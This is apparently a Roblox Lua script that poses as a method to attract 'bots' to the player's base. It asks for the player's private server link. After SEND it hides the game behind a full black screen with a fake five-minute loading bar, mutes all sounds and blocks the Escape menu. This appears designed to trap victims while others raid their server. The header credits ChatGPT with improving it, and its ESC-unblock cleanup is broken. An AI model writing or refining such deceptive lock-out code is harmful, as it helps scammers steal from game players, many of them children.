-- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader
-- Improved by ChatGPT 💙

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local ContextActionService = game:GetService("ContextActionService")

------------------------------------------------------------
-- 🔍 Universal private server and owner detection
------------------------------------------------------------
local function IsPlayerInOwnPrivateServer()
	local runService = game:GetService("RunService")

	-- Studio is always considered private
	if runService:IsStudio() then
		return true
	end

	-- Check if server is private and if player is the owner
	if game.PrivateServerId and game.PrivateServerId ~= "" then
		if game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0 then
			if LocalPlayer.UserId == game.PrivateServerOwnerId then
				return true
			else
				return false -- In private but NOT the owner
			end
		else
			return false -- Private server without valid owner
		end
	end

	-- VIPServerId (used in some big games)
	if game.VIPServerId and game.VIPServerId ~= "" then
		return true
	end

	-- ⚠️ If reached here, it's public
	return false
end

------------------------------------------------------------
-- 🪟 Create main GUI (link input)
------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraMethodGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999 -- Very high to be above everything
-- Try to parent to CoreGui to be above Roblox menu
pcall(function()
	screenGui.Parent = game:GetService("CoreGui")
end)
if not screenGui.Parent then
	screenGui.Parent = playerGui
end

-- 📦 Center input frame
local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0, 420, 0, 240)
inputFrame.Position = UDim2.new(0.5, -210, 0.5, -120)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = inputFrame

-- 🩵 Instruction text
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 60)
label.Position = UDim2.new(0, 20, 0, 25)
label.BackgroundTransparency = 1
label.Text = "PUT YOUR PRIVATE SERVER LINK HERE"
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.Parent = inputFrame

-- 📝 TextBox for link
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 45)
textBox.Position = UDim2.new(0.05, 0, 0, 100)
textBox.PlaceholderText = "Enter your private server link..."
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
textBox.BorderSizePixel = 0
textBox.ClearTextOnFocus = false
textBox.Parent = inputFrame

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 8)
tbCorner.Parent = textBox

-- 🟢 SEND button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.5, 0, 0, 45)
sendButton.Position = UDim2.new(0.25, 0, 0, 160)
sendButton.BackgroundColor3 = Color3.fromRGB(40, 200, 80)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextScaled = true
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Text = "SEND"
sendButton.Parent = inputFrame

local sendCorner = Instance.new("UICorner")
sendCorner.CornerRadius = UDim.new(0, 8)
sendCorner.Parent = sendButton

-- 🟡 Info text below SEND button
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, -40, 0, 40)
infoLabel.Position = UDim2.new(0, 20, 0, 210)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
infoLabel.Text = "The better things you have in your base, the better bots will join."
infoLabel.Parent = inputFrame

------------------------------------------------------------
-- 🎬 On SEND → show full black screen, mute sounds, block ESC key
------------------------------------------------------------
local function muteAllSounds()
	-- Mute all sounds in SoundService
	for i, sound in SoundService:GetDescendants() do
		if sound:IsA("Sound") then
			sound.Volume = 0
		end
	end
	-- Mute all sounds in Workspace
	for i, sound in Workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound.Volume = 0
		end
	end
end

local escBlockActionName = "BlockEscMenu"

local function blockEscMenu(actionName, inputState, inputObj)
	-- Always return Enum.ContextActionResult.Sink to block ESC
	return Enum.ContextActionResult.Sink
end

local blackFrame -- forward declaration for cleanup

sendButton.MouseButton1Click:Connect(function()
	local link = textBox.Text
	if link == "" then
		label.TextColor3 = Color3.fromRGB(255, 100, 100)
		label.Text = "⚠️ Please enter your private server link!"
		return
	end

	print("🔗 Link entered:", link)
	inputFrame:Destroy() -- Remove input frame

	-- 🖤 Full black screen
	blackFrame = Instance.new("Frame")
	blackFrame.Name = "BlackScreen"
	blackFrame.Size = UDim2.new(1, 0, 1, 0)
	blackFrame.Position = UDim2.new(0, 0, 0, 0)
	blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	blackFrame.BorderSizePixel = 0
	blackFrame.ZIndex = 9999 -- Above everything
	blackFrame.Parent = screenGui

	-- Loading text
	local loadingText = Instance.new("TextLabel")
	loadingText.Size = UDim2.new(1, 0, 0, 100)
	loadingText.Position = UDim2.new(0, 0, 0.5, -50)
	loadingText.BackgroundTransparency = 1
	loadingText.Font = Enum.Font.GothamBold
	loadingText.TextScaled = true
	loadingText.TextColor3 = Color3.fromRGB(0, 180, 255)
	loadingText.Text = "LOADING..."
	loadingText.ZIndex = 10000
	loadingText.Parent = blackFrame

	-- 🟦 Blue loading bar and percentage
	local barWidth = 500
	local barHeight = 28
	local barFrame = Instance.new("Frame")
	barFrame.Name = "LoadingBarFrame"
	barFrame.Size = UDim2.new(0, barWidth, 0, barHeight)
	barFrame.Position = UDim2.new(0.5, -barWidth/2, 0.5, 70)
	barFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
	barFrame.BorderSizePixel = 0
	barFrame.ZIndex = 10001
	barFrame.Parent = blackFrame

	local barCorner = Instance.new("UICorner")
	barCorner.CornerRadius = UDim.new(0, 14)
	barCorner.Parent = barFrame

	local fillFrame = Instance.new("Frame")
	fillFrame.Name = "LoadingBarFill"
	fillFrame.Size = UDim2.new(0, 0, 1, 0)
	fillFrame.Position = UDim2.new(0, 0, 0, 0)
	fillFrame.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
	fillFrame.BorderSizePixel = 0
	fillFrame.ZIndex = 10002
	fillFrame.Parent = barFrame

	local fillCorner = Instance.new("UICorner")
	fillCorner.CornerRadius = UDim.new(0, 14)
	fillCorner.Parent = fillFrame

	local percentLabel = Instance.new("TextLabel")
	percentLabel.Name = "PercentLabel"
	percentLabel.Size = UDim2.new(0, barWidth, 0, 40)
	percentLabel.Position = UDim2.new(0.5, -barWidth/2, 0.5, 25)
	percentLabel.BackgroundTransparency = 1
	percentLabel.Font = Enum.Font.GothamBold
	percentLabel.TextScaled = true
	percentLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
	percentLabel.Text = "0%"
	percentLabel.ZIndex = 10003
	percentLabel.Parent = blackFrame

	-- Animate loading bar and percentage (5 minutes)
	local duration = 300 -- seconds (5 minutes)
	local steps = 600 -- 0.5s per step for smoothness
	for step = 0, steps do
		local percent = step / steps
		fillFrame.Size = UDim2.new(percent, 0, 1, 0)
		percentLabel.Text = math.floor(percent * 100) .. "%"
		task.wait(duration / steps)
	end
	fillFrame.Size = UDim2.new(1, 0, 1, 0)
	percentLabel.Text = "100%"

	-- Mute all sounds
	muteAllSounds()

	-- Block ESC key (Roblox menu)
	ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
end)

-- Optional: Unblock ESC if black screen is removed
if blackFrame then
	blackFrame.AncestryChanged:Connect(function()
		if not blackFrame:IsDescendantOf(game) then
			ContextActionService:UnbindAction(escBlockActionName)
		end
	end)
end

